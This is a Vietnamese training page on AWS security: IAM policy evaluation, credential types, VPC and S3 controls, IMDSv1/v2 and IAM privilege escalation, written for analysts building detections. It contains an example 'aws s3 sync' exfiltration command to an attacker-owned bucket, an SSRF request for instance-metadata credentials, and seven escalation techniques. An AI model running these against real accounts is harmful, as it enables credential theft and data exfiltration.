---
id: cloud-security-architecture-attacks
title: AWS Cloud Security — Kiến trúc Bảo mật & Kỹ thuật Tấn công
sidebar_label: 2. Kiến trúc & Kỹ thuật Tấn công
sidebar_position: 2
description: Phân tích kiến trúc an ninh AWS — Logic đánh giá quyền IAM, kỹ thuật phòng thủ mạng và S3, hiểm họa SSRF vào IMDSv1/v2, cùng 7 kỹ thuật leo thang đặc quyền (privilege escalation) thường gặp.
---

# AWS Cloud Security: Kiến trúc Bảo mật & Kỹ thuật Tấn công

> Tài liệu phân tích kiến trúc an ninh, cơ chế phân quyền IAM và các kỹ thuật tấn công thường gặp trên AWS, kết hợp góc nhìn khai thác và phòng thủ phục vụ công tác điều tra và xây dựng detection rule.

---

## 1. Tư duy bảo mật cloud: identity là ranh giới mới

Trong môi trường cloud, ranh giới an ninh dịch chuyển từ tầng mạng sang tầng danh tính (identity). Khác với mạng on-premises nơi quyền truy cập thường gắn với IP và phân vùng mạng nội bộ, tài nguyên cloud được bảo vệ bởi chính sách xác thực và phân quyền (IAM policy).

Nếu kẻ tấn công lấy được credential có quyền hạn rộng, chúng có thể gọi API trực tiếp từ bất kỳ đâu qua Internet để đọc dữ liệu hoặc thay đổi cấu hình mà không cần đi qua tường lửa mạng nào. Vì vậy, việc hiểu sâu cơ chế phân quyền của IAM và cách credential được cấp phát là yêu cầu bắt buộc đối với analyst.

---

## 2. Phân quyền IAM chuyên sâu

### 2.1 Bốn loại policy cốt lõi

1. **Identity-based policy:** Gán trực tiếp cho IAM user, group hoặc role. Bao gồm managed policy (chính sách dùng chung do AWS hoặc người dùng quản lý) và inline policy (chính sách nhúng trực tiếp vào một identity cụ thể).
2. **Resource-based policy:** Cấu hình trực tiếp trên tài nguyên (như S3 bucket policy, KMS key policy, SQS queue policy). Loại policy này bắt buộc phải có trường `Principal` để chỉ định ai được phép thao tác.
3. **Trust policy:** Một dạng resource-based policy gắn trên IAM role để xác định danh tính nào được phép assume role đó (có thể là một service như EC2 hoặc một tài khoản AWS khác).
4. **Permissions boundary và SCP:**
   - **Permissions boundary:** Đặt trần quyền tối đa cho một IAM user hoặc role cụ thể. Dù user được gán quyền admin, quyền thực tế cũng không thể vượt qua ranh giới này.
   - **Service Control Policy (SCP):** Áp dụng ở cấp tổ chức (AWS Organizations) xuống các tài khoản thành viên. Lệnh deny trong SCP có hiệu lực phủ quyết trên toàn bộ tài khoản con, kể cả với tài khoản root của tài khoản đó.

---

### 2.2 Logic đánh giá quyền của IAM

Khi có một API call gửi tới AWS, hệ thống đánh giá quyền theo quy trình sau:

```
[ API Request ]
       │
       ▼
┌──────────────────────────────────────┐
│ Có Explicit Deny ở bất kỳ đâu không? │───(Có)────► [ Từ chối (Deny) ]
│ (SCP, Boundary, Identity, Resource)  │
└──────────────────┬───────────────────┘
                 (Không)
                   ▼
┌──────────────────────────────────────┐
│ Có thỏa mãn SCP và Boundary không?   │───(Không)──► [ Từ chối (Deny) ]
└──────────────────┬───────────────────┘
                  (Có)
                   ▼
┌──────────────────────────────────────┐
│ Có ít nhất một Explicit Allow không? │───(Không)──► [ Từ chối mặc định (Implicit Deny) ]
└──────────────────┬───────────────────┘
                  (Có)
                   ▼
       [ Cho phép (Allow) ]
```

Các nguyên tắc cần nhớ khi phân tích quyền:
- Mọi thao tác mặc định bị từ chối ngầm (**implicit deny**).
- Cần có ít nhất một lệnh cho phép tường minh (**explicit allow**).
- Một lệnh từ chối tường minh (**explicit deny**) ở bất kỳ policy nào sẽ luôn ghi đè và vô hiệu hóa mọi lệnh allow khác.

---

### 2.3 Phân biệt access key tĩnh và credential tạm thời (STS)

Khi phân tích log trong CloudTrail, trường `accessKeyId` và `principalId` giúp xác định loại thông tin xác thực đang được sử dụng:

| Tiền tố | Loại credential | Nguồn gốc | Đặc điểm khi điều tra |
|---|---|---|---|
| **`AKIA...`** | Permanent access key | Tạo trực tiếp cho IAM user. | Tồn tại lâu dài cho đến khi bị xóa hoặc vô hiệu hóa. Rất dễ bị lộ trên kho mã nguồn công khai. |
| **`ASIA...`** | Temporary credential | Do AWS STS sinh ra khi gọi `AssumeRole`, `GetSessionToken` hoặc từ EC2 instance profile. | Có thời hạn ngắn (thường từ 15 phút đến 12 giờ) và đi kèm `sessionToken`. |
| **`AROA...`** | Unique Role ID | Định danh nội bộ của IAM role. | Thường xuất hiện trong trường `userIdentity.principalId` của CloudTrail dưới dạng `AROA...:session-name`. |
| **`AIDA...`** | Unique User ID | Định danh nội bộ của IAM user. | Xuất hiện trong trường `userIdentity.principalId` khi user gọi API. |

---

## 3. Bảo mật mạng và kiểm soát luồng dữ liệu

### 3.1 Security group vs Network ACL

Trong Amazon VPC, hai lớp tường lửa ảo phối hợp để kiểm soát lưu lượng mạng:

| Tiêu chí | Security group | Network ACL (NACL) |
|---|---|---|
| Cấp độ áp dụng | Giao diện mạng ảo của máy chủ (ENI/instance). | Phân vùng mạng (subnet). |
| Trạng thái | **Stateful:** nếu mở chiều vào, gói tin phản hồi chiều ra tự động được cho phép. | **Stateless:** phải cấu hình riêng cả chiều vào và chiều ra. |
| Loại quy tắc | Chỉ hỗ trợ luật cho phép (**Allow**). | Hỗ trợ cả luật cho phép (**Allow**) và cấm (**Deny**). |
| Thứ tự thực thi | Đánh giá toàn bộ rules cùng lúc. | Đánh giá tuần tự theo rule number từ nhỏ đến lớn. |
| Vai trò cho SOC | Cấu hình mở cổng dịch vụ thông thường. | Dùng để chặn nhanh IP độc hại hoặc C2 ở cấp độ subnet khi xảy ra sự cố. |

---

### 3.2 Kiểm soát thất thoát dữ liệu qua VPC endpoint

Trong cấu trúc mạng thông thường, máy ảo EC2 ở private subnet khi gọi S3 sẽ đi qua NAT Gateway ra Internet. Kẻ tấn công khi chiếm được shell trên máy ảo có thể thực hiện lệnh sao chép dữ liệu sang một S3 bucket ngoài do chính chúng kiểm soát:

```bash
aws s3 sync /var/data/internal-docs/ s3://attacker-owned-bucket/
```

Lệnh này thành công vì máy chủ có đường Internet ra ngoài và S3 dùng public endpoint.

Để khắc phục, tổ chức triển khai **VPC Gateway Endpoint for S3** và gắn **VPC Endpoint Policy**. Chính sách này giới hạn máy chủ trong VPC chỉ được phép tương tác với các S3 bucket thuộc quyền sở hữu của công ty:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RestrictToCompanyBuckets",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-internal-data",
        "arn:aws:s3:::company-internal-data/*"
      ],
      "Condition": {
        "StringEquals": {
          "aws:PrincipalAccount": "123456789012"
        }
      }
    }
  ]
}
```

---

### 3.3 Quản trị máy chủ qua AWS SSM Session Manager

Mô hình truyền thống dùng bastion host mở cổng SSH (port 22) hoặc RDP (port 3389) ra Internet tiềm ẩn rủi ro brute-force và thất lạc SSH private key.

Mô hình an toàn hơn là sử dụng **AWS Systems Manager (SSM) Session Manager**:
- Không cần mở bất kỳ cổng inbound nào trên security group (cổng 22 và 3389 đều đóng hoàn toàn).
- Máy chủ chạy `amazon-ssm-agent`, chỉ mở kết nối outbound HTTPS (port 443) tới endpoint của AWS SSM.
- Người dùng xác thực qua IAM (có bắt buộc MFA) và mở phiên shell qua console hoặc CLI.
- Toàn bộ lệnh gõ và output trong phiên làm việc đều được ghi log tự động vào S3 hoặc CloudWatch Logs để phục vụ kiểm toán.

---

## 4. Bảo mật lưu trữ S3

### 4.1 S3 Block Public Access

Tính năng Block Public Access cung cấp 4 lớp bảo vệ độc lập ở cấp account hoặc cấp bucket:

1. `BlockPublicAcls`: Chặn không cho thêm ACL mới có tính chất công khai.
2. `IgnorePublicAcls`: Bỏ qua toàn bộ các public ACL hiện có trên bucket.
3. `BlockPublicPolicy`: Chặn việc lưu bucket policy mới nếu chính sách đó cấp quyền công khai.
4. `RestrictPublicBuckets`: Giới hạn quyền truy cập vào bucket có policy công khai chỉ cho dịch vụ AWS nội bộ và user thuộc tài khoản sở hữu.

Khuyến nghị thông thường là bật đủ cả 4 cờ này trên mọi bucket, trừ những bucket được dùng chuyên biệt làm static website công khai.

---

### 4.2 Mã hóa và vai trò của KMS key policy

S3 hỗ trợ mã hóa at-rest qua 3 cơ chế:
- **SSE-S3:** Dùng khóa do S3 tự quản lý (`AES-256`), miễn phí nhưng không kiểm soát được quyền giải mã độc lập.
- **SSE-KMS:** Dùng Customer Managed Key (CMK) trong AWS KMS. Điểm quan trọng đối với an ninh là: dù kẻ tấn công có quyền đọc S3 (`s3:GetObject`), nhưng nếu không có quyền `kms:Decrypt` trên key policy của KMS, chúng vẫn không thể đọc được nội dung tệp tin.
- **SSE-C:** Khách hàng tự truyền khóa mã hóa trong từng header request.

Bắt buộc kết nối mã hóa in-transit bằng cách thêm điều kiện deny các request không dùng HTTPS vào bucket policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceHTTPSOnly",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-confidential-bucket",
        "arn:aws:s3:::company-confidential-bucket/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

---

## 5. Bảo mật EC2 và hiểm họa từ Instance Metadata Service (IMDS)

### 5.1 Kịch bản tấn công SSRF vào IMDSv1

Instance Metadata Service (IMDS) là dịch vụ nội bộ chạy tại IP link-local `169.254.169.254`, chỉ có thể truy cập từ bên trong máy ảo EC2. Dịch vụ này cung cấp metadata của máy chủ, bao gồm **credential tạm thời của IAM role gắn trên instance đó**.

Khi ứng dụng web chạy trên EC2 dính lỗ hổng SSRF (Server-Side Request Forgery), kẻ tấn công có thể lợi dụng ứng dụng để gọi tới IMDSv1:

```
[ Attacker ]
     │ 1. Gửi request khai thác SSRF trên webapp:
     │    GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole
     ▼
[ Web App trên EC2 ]
     │ 2. Webapp thực hiện request nội bộ tới IP link-local:
     ▼    GET http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole
[ IMDSv1 (169.254.169.254) ]
     │ 3. Trả về JSON chứa AccessKeyId, SecretAccessKey, Token tạm thời
     ▼
[ Attacker ]
     │ 4. Nhận credential qua response của webapp
     ▼
[ Máy cá nhân của Attacker ]
     │ 5. Đưa credential vào AWS CLI để gọi API từ bên ngoài
     ▼
[ AWS Control Plane ] (Cho phép truy cập vì token hợp lệ)
```

Đây là chuỗi khai thác thực tế từng xảy ra trong sự cố rò rỉ dữ liệu Capital One năm 2019, dẫn tới việc lộ thông tin của hơn 100 triệu khách hàng.

---

### 5.2 Cơ chế phòng thủ của IMDSv2

Để khắc phục rủi ro trên, AWS giới thiệu **IMDSv2** hoạt động theo mô hình session-oriented:

1. **Bước 1:** Ứng dụng phải gửi request `PUT` kèm header xác định thời gian sống (TTL) của token:
   ```bash
   TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
   ```
2. **Bước 2:** Dùng token vừa lấy được truyền vào header của request tiếp theo:
   ```bash
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole
   ```

**Lý do IMDSv2 ngăn chặn được SSRF:**
- Hầu hết các lỗi SSRF trên ứng dụng chỉ cho phép attacker điều khiển URL với method `GET` hoặc `POST`. Chúng thường không thể ép ứng dụng gửi request dạng `PUT` kèm theo custom header bắt buộc.
- **Hop limit = 1:** Thiết lập TTL của gói tin mạng tới metadata bằng 1. Nếu container chạy trên EC2 gửi gói tin ra ngoài bridge network của host, hop count sẽ về 0 và gói tin bị hủy, ngăn container đọc trộm metadata của máy chủ cha.

Lệnh bắt buộc chuyển sang IMDSv2 qua CLI:
```bash
aws ec2 modify-instance-metadata-options \
    --instance-id i-0123456789abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

---

## 6. Kỹ thuật leo thang đặc quyền (privilege escalation) trên AWS

Sau khi chiếm được một tài khoản có quyền hạn thấp, kẻ tấn công thường tìm cách tận dụng các quyền tiềm ẩn để tự nâng quyền lên admin. Dưới đây là 7 kỹ thuật thường gặp:

1. **`iam:PassRole` kết hợp `lambda:CreateFunction`:** Kẻ tấn công tạo một hàm Lambda mới, gán một IAM role có quyền quản trị sẵn có trong tài khoản cho hàm đó qua `PassRole`, rồi gọi hàm (`lambda:InvokeFunction`) để chạy code tạo thêm admin user mới.
2. **`iam:CreatePolicyVersion`:** Một managed policy cho phép lưu tối đa 5 version. Kẻ tấn công tự tạo một version mới có quyền `Action: "*", Resource: "*"` và đặt làm default version.
3. **`iam:SetDefaultPolicyVersion`:** Kẻ tấn công chuyển policy đang dùng về một version cũ trước đây từng có quyền admin nhưng chưa bị xóa.
4. **`iam:AttachUserPolicy` / `iam:AttachRolePolicy`:** Tự gán chính sách `AdministratorAccess` vào chính tài khoản của mình.
5. **`iam:PutUserPolicy` / `iam:PutRolePolicy`:** Tự tạo một inline policy mới chứa toàn bộ quyền quản trị gắn vào tài khoản của mình.
6. **`iam:CreateAccessKey` trên user khác:** Tạo access key mới trên một tài khoản quản trị viên khác rồi dùng key đó để thao tác.
7. **`iam:UpdateLoginProfile`:** Đặt lại mật khẩu đăng nhập console của một tài khoản quản trị viên khác.

---

## 7. Ánh xạ MITRE ATT&CK for Cloud

Các hành vi tấn công trên AWS tương ứng với các kỹ thuật trong ma trận MITRE ATT&CK:

| Tactic | Technique ID | Tên kỹ thuật | Hành vi điển hình trên AWS |
|---|---|---|---|
| Initial Access | `T1078.004` | Valid Accounts: Cloud Accounts | Đăng nhập bằng access key bị lộ hoặc đánh cắp qua phishing. |
| Execution | `T1059.009` | Cloud Hosted Engine | Chạy lệnh từ xa qua `ssm:SendCommand` hoặc gọi hàm Lambda. |
| Persistence | `T1098.001` | Account Manipulation: Additional Cloud Credentials | Tạo access key mới (`CreateAccessKey`) hoặc thêm SSH key vào instance. |
| Privilege Escalation | `T1548` | Abuse Elevation Control Mechanism | Dùng các kỹ thuật `PassRole` hoặc `CreatePolicyVersion` để nâng quyền. |
| Defense Evasion | `T1562.008` | Impair Defenses: Disable Cloud Logs | Tắt CloudTrail (`StopLogging`, `DeleteTrail`) hoặc xóa GuardDuty detector. |
| Credential Access | `T1552.005` | Unsecured Credentials: Cloud Instance Metadata API | Tấn công SSRF để lấy token tạm thời từ IMDS `169.254.169.254`. |
| Discovery | `T1526` | Cloud Service Discovery | Chạy các lệnh dò quét quyền (`GetCallerIdentity`, `ListUsers`, `DescribeInstances`). |
| Exfiltration | `T1537` | Transfer Data to Cloud Account | Sao chép dữ liệu S3 sang bucket ngoài hoặc chia sẻ snapshot ổ đĩa sang account khác. |
| Impact | `T1496` | Resource Hijacking | Tạo máy ảo cấu hình cao ở region lạ để đào tiền mã hóa. |

---

## 8. Quản trị cấu hình và tuân thủ (CSPM)

- **CIS AWS Foundations Benchmark:** Bộ khuyến nghị kiểm tra cấu hình an toàn gồm hơn 50 tiêu chí (bật MFA cho root, cấm mở port 22/3389 ra Internet, bật CloudTrail đa region).
- **AWS Security Hub:** Đóng vai trò là công cụ CSPM (Cloud Security Posture Management) tự động kiểm tra tài khoản theo các tiêu chuẩn bảo mật và tính điểm tuân thủ.
- **AWS Config:** Theo dõi liên tục các thay đổi cấu hình tài nguyên (configuration drift) và cảnh báo khi có tài nguyên vi phạm quy tắc an ninh.

---

## 9. Bài tập và câu hỏi tự kiểm tra

1. Một tài khoản IAM user được gán quyền `AdministratorAccess` nhưng vẫn nhận lỗi `AccessDenied` khi truy cập một S3 bucket. Những nguyên nhân nào có thể dẫn tới tình trạng này?
2. Trong CloudTrail log, sự xuất hiện của `accessKeyId` bắt đầu bằng `ASIA...` từ một IP công cộng lạ cho biết điều gì về loại credential đang bị lạm dụng?
3. Tại sao việc đặt `http-put-response-hop-limit` bằng 1 trong IMDSv2 lại giúp bảo vệ các container chạy trên EC2 khỏi nguy cơ đọc trộm metadata?
